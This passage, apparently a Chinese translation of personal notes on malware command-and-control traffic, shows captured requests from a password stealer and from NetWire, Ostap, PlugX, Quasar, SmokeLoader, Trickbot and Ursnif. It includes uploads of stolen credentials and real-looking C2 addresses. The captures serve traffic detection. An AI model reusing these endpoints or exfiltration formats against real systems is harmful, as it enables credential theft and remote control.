> Content-Length: 1526  
> Cache-Control: no-cache
>
> \-----------------------------58748130728276  
> Content-Disposition: form-data; name="userfile"; filename="admin-MM-PC-> passwords.txt"  
> Content-Type:application/x-gzip
>
>  
> ########## User: admin ##########
>
> \------------------- Firefox passwords ----------------->
> [+] Password found !!!  
> URL: https://m.facebook.com  
> Login: test@test.com  
> Password: testpassword
>
> \------------------- Outlook passwords ----------------->
> [-] Password not found !!!  
> Account Name: test@test.com.  
> POST /te.php HTTP/1.1  
> Content-Type: multipart/form-data;
> boundary=---------------------------58748130728276  
> User-Agent: Mozilla/5.0 Gecko/20100115 Firefox/3.6  
> Host: 192.168.1.44  
> Content-Length: 1526  
> Cache-Control: no-cache
>
> \-----------------------------58748130728276  
> Content-Disposition: form-data; name="userfile"; filename="admin-MM-PC-> passwords.txt"  
> Content-Type:application/x-gzip
>
>  
> ########## User: admin ##########
>
> \------------------- Firefox passwords ----------------->
> [+] Password found !!!  
> URL: https://m.facebook.com  
> Login: test@test.com  
> Password: testpassword
>
> \------------------- Outlook passwords ----------------->
> [-] Password not found !!!  
> Account Name: test@test.com.  
> POP3 User: test@test.com.  
> POP3 Server: 192.168.1.1.  
> u'Delivery Store EntryID:
> \x00\x00\ua138\u10bb\ue505\u1a10\ubba1\x08\u2a2b\uc256\x00\u736d\u7370\u2e74\u6c64l\x00\x00\u494e\u4154\ubff9\u01b8\uaa00\u3700\u6ed9\x00\x00C:\\\Users\\\admin\\\Documents\\\Outlook
> Files\\\test@test.com.pst\x00'  
> SMTP Secure Connection: 0  
> SMTP Server: 192.168.1.1.  
> Mini UID: 224868084  
> 'Delivery Folder EntryID: \x00\x00\x00\x00\x81
> \xa1\x9f\x92\x06>N\x9c\xc7t\xd9H\xba>f\x82\x80\x00\x00'  
> u'clsid:
> \u457b\u3444\u3537\u3134\u2d31\u3042\u3644\u312d\u4431\u2d32\u4338\u4233\u302d\u3130\u3430\u3242\u3641\u3736\u7d36'  
> Display Name: test Mail.  
> POP3 Password: testpassword.  
> Email: test@test.com.  
> u'Leave on Server: \u3139\u3537\u3730'
>
> \------------------- Google chrome passwords ----------------->
> [+] Password found !!!  
> URL:  
> Login: test@test.com  
> Password: testpassword
>
>  
> [+] 3 passwords have been found.  
> For more information launch it again with the -v option
>
> elapsed time = 2.4423969775
>
> \-----------------------------58748130728276-->
> HTTP/1.1 200 OK  
> Date: Tue, 15 Sept 2019 12:08:01 GMT  
> Server: Apache/2.4.18 (Ubuntu)  
> Content-Length: 1  
> Content-Type: text/html; charset=UTF-8

### NetWire

#### NetWire的密钥日志文件以模糊的形式存储在受感染的计算机上。很容易发现“4100000099”初始包。流量特征如下

> 00000000 41 00 00 00 99 80 3a e0 e8 5f d7 ea 8c af 76 cc A.....:. ._....v.  
> 00000010 c2 cc ad 5a 10 72 cc d0 5e 64 d8 50 80 fc b6 e6 ...Z.r.. ^d.P....  
> 00000020 54 25 bf e0 ea 7f 7b e4 ff 54 70 e8 eb c0 fa 80 T%....{. .Tp.....  
> 00000030 a0 a0 f3 a0 b0 0a 94 04 84 31 7c 3f e7 8c 90 c5 ........ .1|?....  
> 00000040 ce c2 11 97 d9 .....

#### Ostap

Ostap是一种商品JScript下载器。流量特征如下

> POST /angola/mabutu.php?pi=29h&tan=cezar&z=662343339&n=0&u=20&an=9468863238
> HTTP/1.1  
> Connection: Keep-Alive  
> Content-Type: text/plain; Charset=UTF-8  
> Accept: */*  
> Accept-Language: en-US  
> User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)  
> Content-Length: 1034  
> Host: 185.180.199.91
>
> Microsoft Windows 7 Professional 6.1.7601*Locale:0409  
> C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start
> Menu\Programs\Startup\sent64.jse  
> USER-PC*DELL*DELL*0
>
> System Idle Process*null  
> System*null  
> smss.exe*null  
> csrss.exe*null  
> wininit.exe*null  
> csrss.exe*null  
> winlogon.exe*null  
> services.exe*null  
> lsass.exe*null  
> lsm.exe*null  
> svchost.exe*null  
> svchost.exe*null  
> svchost.exe*null  
> svchost.exe*null  
> svchost.exe*null  
> svchost.exe*null  
> svchost.exe*null  
> spoolsv.exe*null  
> svchost.exe*null  
> svchost.exe*null  
> svchost.exe*null  
> dwm.exe*C:\Windows\system32\Dwm.exe  
> explorer.exe*C:\Windows\Explorer.EXE  
> taskhost.exe*C:\Windows\system32\taskhost.exe  
> SearchIndexer.exe*null  
> qemu-ga.exe*null  
> audiodg.exe*null  
> WmiPrvSE.exe*null  
> SearchProtocolHost.exe*null  
> windanr.exe*C:\Windows\system32\windanr.exe  
> OSPPSVC.EXE*null  
> wscript.exe*C:\Windows\system32\wscript.exe  
> wscript.exe*C:\Windows\system32\wscript.exe  
> SearchFilterHost.exe*null  
> WINWORD.EXE*C:\Program Files\Microsoft Office\Office14\WINWORD.EXE  
> WmiPrvSE.exe*null

### PlugX

RSA将PlugX描述为Rate(RemoteAccess特洛伊木马)恶意软件家族。

> POST /update?wd=b0b9d49c HTTP/1.1  
> Accept: */*  
> x-debug: 0  
> x-request: 0  
> x-content: 61456  
> x-storage: 1  
> User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1;  
> Host: 192.168.1.44:8080  
> Content-Length: 0  
> Connection: Keep-Alive  
> Cache-Control: no-cache
>
>  
>
> ............?PEOJNOOBAAHDMKNGELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com.................?JJIOHDOBJEIEIBJJELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com.................?DBCGBLOBDMGFEIEMELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com.................?JJIOHDOBJEIEIBJJELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com................=.a.gtld-> servers.net..nstld.verisign-grs..]..A.........
> :...Q.............?PEOJNOOBAAHDMKNGELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com................=.a.gtld-> servers.net..nstld.verisign-grs..]..2.........
> :...Q.............?DBCGBLOBDMGFEIEMELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com................=.a.gtld-> servers.net..nstld.verisign-grs..]..2......... :...Q.
>
>  
> GET /EF003AAB6425775CD949B40C HTTP/1.1  
> Accept: */*  
> Cookie: QhTbeUW+YzYYsZWz0PQvBvYIgo8=  
> User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; SLCC2;)  
> Host: WOUDERFULU.impresstravel.ga  
> Connection: Keep-Alive  
> Cache-Control: no-cache
>
> HTTP/1.1 203  
> Server: nginx  
> Date: Tue, 02 October 2019 17:32:40 GMT  
> Content-Type: text/html;charset=UTF-8  
> Content-Length: 660  
> Connection: keep-alive  
> Cache-Control: no-cache  
> Pragma: no-cache  
> Expires: Thu, 01 Jan 1970 00:00:00 GMT  
> X-Server: ip-172-31-28-245  
> Set-Cookie: JSESSIONID=4618E9008B004BEE8FE5C81AB063A332; Path=/; HttpOnly

### Quasar

#### Quasar是一个用.NET编写的恶意软件系列。流量特征如下

> 00000000 40 00 00 00 3e 83 58 08 ad d1 05 8d 77 20 53 1f @...>.X. ....w S.  
> 00000010 dc 2e e8 99 0a f3 f1 bb 3a 8c c2 a1 9d 72 4a 69 ........ :....rJi  
> 00000020 e6 60 97 da 1e 76 87 16 91 f2 1b c2 f4 89 f9 8a .`...v.. ........  
> 00000030 20 5b 19 e5 7c ae ed f1 b4 5a d2 ce 5f 86 17 20 [..|... .Z.._..  
> 00000040 c6 b3 03 8c

### SmokeLoader

SmokeLoader系列是一个通用后门，它的功能范围取决于在任何给定的恶意软件构建中包含的模块。

> POST / HTTP/1.1  
> Cache-Control: no-cache  
> Connection: Keep-Alive  
> Pragma: no-cache  
> Content-Type: application/x-www-form-urlencoded  
> Accept: */*  
> Referer: http://thankg1.org/  
> User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0)
> like Gecko  
> Content-Length: 299  
> Host: thankg1.org
>
>
> ..ngl$j.N...$.=\\..98h...8..XO.(3ET]...p1.Z.Q.....GI.1R..j6......NF`&....."5..V.~...#.,w......\N.V`.gI..0&.  
> .N.Z...%.b.....V..3H....t..6w.....7.0..  
> ..+.........O..`...4..A..wT.F...XM&2.^.Y................E.4
> W`.......(.....<,.zK..>c..^...p......n.z"]....\S,[.  
> ......qV4`..Pu*...8W.........M .h.v.S.:.

### Trickbot

#### Trickbot有多个模块，包括VNC和Socks 5代理。使用SSL进行C2通信。流量特征如下

> GET https://190.154.203.218:449/trg448/JONATHAN-> PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/5/spk/  
> << 200 OK 224b  
> GET http://54.225.92.64/  
> << 200 OK 12b  
> GET https://190.154.203.218:449/trg448/JONATHAN-> PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/0/Windows%207%20x64%20SP1/1075/167.88.7.134/77CAB0693C33C9DA65ECB06B990E1B2A0B60E199332E20B769B1041E6155930A/7FPzmRZqhwAAJvgTcFSqNLk/  
> << 200 OK 937b  
> GET https://190.154.203.218:449/trg448/JONATHAN-> PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/user/SYSTEM/0/  
> << 200 OK  
> GET https://190.154.203.218:449/trg448/JONATHAN-> PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/path/C:%5CUsers%5CJonathan%5CAppData%5CRoaming%5CnetRest%5C%E4%BB%BB%E3%81%AF%E3%82%A7%E7%A7%81%E3%81%8D%E7%A7%81%E6%8A%B1%E3%81%9F%E3%82%82%E3%81%A1%E6%84%9B.exe/0/

### Ursnif

流量特征如下

> POST
> /images/wsF0B4sp/ZaYjjdVgt73Q1BSOy_2Fofi/qF_2BfPTuK/5Ha_2F0xEvmbSfT_2/FluJ8ZF_2Fx8/g6xkZAZrZwN/2skHgzv92i_2BS/uPf4RDQvATKCgx0GZ5gez/ph_2BLcscLQkKDVw/HGZ6zA6DhGCqgPD/VTX09Q_2FUWIFyWps1/nfJ0I3rIZ/QNKbXjeu7xXa3W_2FZSX/bcWtE2RafXFoRlqL/4EYHwclzkXrfX/58a3.bmp
> HTTP/1.1  
> Cache-Control: no-cache  
> Connection: Keep-Alive  
> Pragma: no-cache  
> Content-Type: multipart/form-data; boundary=36775038942641984568  
> User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)  
> Content-Length: 399  
> Host: shoshanna.at
>
> \--36775038942641984568  
> Content-Disposition: form-data; name="upload_file"; filename="78C6.bin"
>
>
> \\.\\..V.]:.o..<]......H..)E.J=x...e%3..U.@.f......].tZ..1....g..OzC.5v.?o.NL...;..)..E.G.a~.....M#;.Cu;N/.3\$....x.....R....e..5.....-mW,..
> ..C................n.G.|..k0...@...?I.Iu......9k^.U6tzT9.b.3....#..V.4].La....zL.h+...aa..H.D.....Ar.......3.w.<.!.-.....|F9!
> 3.....7  
> \--36775038942641984568--
参考链接：https://marcoramili.com/2021/01/09/c2-traffic-patterns-personal-notes/

